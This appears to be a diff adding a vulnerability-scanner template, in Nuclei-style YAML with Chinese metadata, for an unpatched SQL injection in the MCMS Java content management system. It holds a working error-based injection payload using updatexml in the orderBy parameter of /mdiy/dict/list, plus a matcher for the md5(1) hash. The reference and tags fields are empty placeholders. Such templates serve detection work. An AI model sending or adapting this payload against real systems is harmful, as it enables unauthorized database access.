@@ -1,0 +1,23 @@
+id: MCMS-orderBy-sqli
+info:
+  name: MCMS SQL注入漏洞
+  author: apple
+  severity: high
+  description: MCMS是一个<完整开源的Java CMS！基于SpringBoot 2架构，前端基于vue、element ui。MCMS存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息等。”,目前厂商暂未发布修复措施解决此安全问题，建议使用此软件的用户随时关注厂商主页或参考网址以获取解决办法。
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET /mdiy/dict/list?dict=c&dictType=%E6%96%87%E7%AB%A0%E5%B1%9E%E6%80%A7&orderBy=0%20or%20updatexml(1,concat(0x7e,(SELECT%20md5(1)),0x7e),1) HTTP/2
+        Host: {{Hostname}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c4ca4238a0b923820dcc509a6f75849b'
